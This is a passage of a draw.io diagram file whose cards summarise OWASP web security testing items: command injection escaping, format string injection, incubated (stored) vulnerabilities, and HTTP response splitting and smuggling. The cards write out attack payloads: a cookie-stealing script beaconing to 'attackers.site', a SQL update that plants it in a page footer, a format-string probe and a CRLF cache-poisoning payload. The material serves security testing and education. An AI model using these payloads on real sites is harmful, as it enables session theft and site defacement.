200);&quot;&gt;.&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&quot;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;%&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;@&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;:&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;+&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;,&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;`&lt;/i&gt;.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Escape or filter special characters for Linux: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;{&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;}&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;(&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;)&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;amp;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;*&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;‘&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;|&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;=&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;?&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;[&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;]&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;$&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;–&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;#&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;~&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;!&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&quot;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;%&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;:&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;+&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;,&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;`&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;The web application and its components should be running under strict permissions that do not allow operating system command execution.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://owasp.org/www-project-webgoat/&quot;&gt;OWASP WebGoat&lt;/a&gt;, &lt;a href=&quot;https://github.com/commixproject/commix&quot;&gt;Commix&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="780" width="400" x="2440" y="8180" as="geometry" />
        </mxCell>
        <mxCell id="M9q9ovhkxiswIcJwhkmQ-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-13&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Format String Injection&lt;/h1&gt;&lt;p&gt;A format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behaviour from the application.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Tests include analysis of the code and injecting conversion specifiers as user input to the application under test.&lt;/p&gt;&lt;p&gt;Static analysis tools can find format string vulnerabilities in either the code or in binaries.&lt;/p&gt;&lt;p&gt;Look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;https://vulnerable_host/userinfo?username=&lt;b&gt;%25s%25s%25s%25n&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Fuzzing tools can automate injection tests.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://github.com/xmendez/wfuzz&quot;&gt;Wfuzz&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://owasp.org/www-community/attacks/Format_string_attack&quot;&gt;OWASP Format string attack&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="440" width="400" x="2440" y="8960" as="geometry" />
        </mxCell>
        <mxCell id="M9q9ovhkxiswIcJwhkmQ-4" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-14&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Incubated Vulnerability&lt;/h1&gt;&lt;p&gt;Incubated vulnerabilities are typically used to conduct “watering hole” attacks against users of legitimate web applications.&lt;/p&gt;&lt;p&gt;Incubated vulnerabilities have the following characteristics:&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;The attack vector needs to be persisted in the first place;&lt;/li&gt;&lt;li&gt;Once the attack vector was “recalled” the vector would need to be executed successfully.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify injections that are stored and require a recall step to the stored injection.&lt;/li&gt;&lt;li&gt;Understand how a recall step could occur.&lt;/li&gt;&lt;li&gt;Set listeners or activate the recall step if possible.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;script&amp;gt;document.write(&#39;&amp;lt;img src=&quot;http://attackers.site/cv.jpg?&#39;+&lt;b&gt;document.cookie&lt;/b&gt;+&#39;&quot;&amp;gt;&#39;)&amp;lt;/script&amp;gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;SELECT field1, field2, field3&lt;br&gt;FROM table_x&lt;br&gt;WHERE field2 = &#39;x&#39;;&lt;br&gt;&amp;nbsp; &amp;nbsp;UPDATE footer&lt;br&gt;&amp;nbsp; &amp;nbsp;SET notice = &#39;Copyright 1999-2030%20&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;b&gt;&amp;lt;script&amp;gt;document.write(\&#39;&amp;lt;img src=&quot;http://attackers.site/cv.jpg?\&#39;+document.cookie+\&#39;&quot;&amp;gt;\&#39;)&amp;lt;/script&amp;gt;&lt;/b&gt;&#39;&lt;br&gt;&amp;nbsp; &amp;nbsp;WHERE notice = &#39;Copyright 1999-2030&#39;;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Examining input validation is key in mitigating against this vulnerability.&lt;/p&gt;&lt;p&gt;Output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://sourceforge.net/projects/xss-proxy&quot;&gt;XSS-proxy&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt;, &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="640" width="400" x="2440" y="9400" as="geometry" />
        </mxCell>
        <mxCell id="M9q9ovhkxiswIcJwhkmQ-5" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;fontFamily=Times New Roman;whiteSpace=wrap;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-15&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for HTTP Splitting Smuggling&lt;/h1&gt;&lt;p&gt;This section illustrates examples of attacks that leverage specific features of the HTTP protocol, either by exploiting weaknesses of the web application or peculiarities in the way different agents interpret HTTP messages.&lt;/p&gt;&lt;p&gt;&lt;b&gt;HTTP splitting&lt;/b&gt;&amp;nbsp;exploits a lack of input sanitization which allows an intruder to insert CR and LF characters into the headers of the application response and to ‘split’ that answer into two different HTTP messages.&lt;/p&gt;&lt;p&gt;&lt;b&gt;HTTP smuggling&lt;/b&gt;&amp;nbsp;exploits the fact that some specially crafted HTTP messages can be parsed and interpreted in different ways depending on the agent that receives them.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.&lt;/li&gt;&lt;li&gt;Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTP/1.1 302 Moved Temporarily&lt;br&gt;Date: Sun, 03 Dec 2005 16:22:19 GMT&lt;br&gt;Location: http://victim.com/main.jsp?interface=advanced&lt;br&gt;&amp;lt;snip&amp;gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;advanced&lt;b&gt;%0d%0a Content-Length:%200%0d%0a%0d%0a HTTP/1.1%20200%20OK%0d%0a Content-Type:%20text/html%0d%0a Content-Length:%2035%0d%0a%0d%0a &amp;lt;html&amp;gt;Sorry,%20System%20Down&amp;lt;/html&amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;HTTP/1.1 302 Moved Temporarily&lt;br&gt;Date: Sun, 03 Dec 2005 16:22:19 GMT&lt;br&gt;Location: http://victim.com/main.jsp?interface=advanced&lt;br&gt;&lt;b&gt;Content-Length: 0&lt;br&gt;&lt;br&gt;HTTP/1.1 200 OK&lt;br&gt;Content-Type: text/html&lt;br&gt;Content-Length: 35&lt;br&gt;&lt;br&gt;&amp;lt;html&amp;gt;Sorry,%20System%20Down&amp;lt;/html&amp;gt;&lt;/b&gt;&lt;br&gt;&amp;lt;other data&amp;gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;The web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for /index.html, the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to victim.com/index.html passing through that web cache will receive the “system down” message.&lt;/p&gt;&lt;p&gt;Alternatively, the attacker could pass to those users a JavaScript snippet that mounts a cross site scripting attack, e.g., to steal the cookies: identify all user controlled input that influences one or more headers in the response, and check whether they can successfully inject a CR+LF sequence in it.&lt;br&gt;&lt;/p&gt;&lt;p&gt;the most likely candidates for this attack are&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Location&lt;/i&gt; and&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Set-Cookie&lt;/i&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="940" width="400" x="2440" y="10040" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
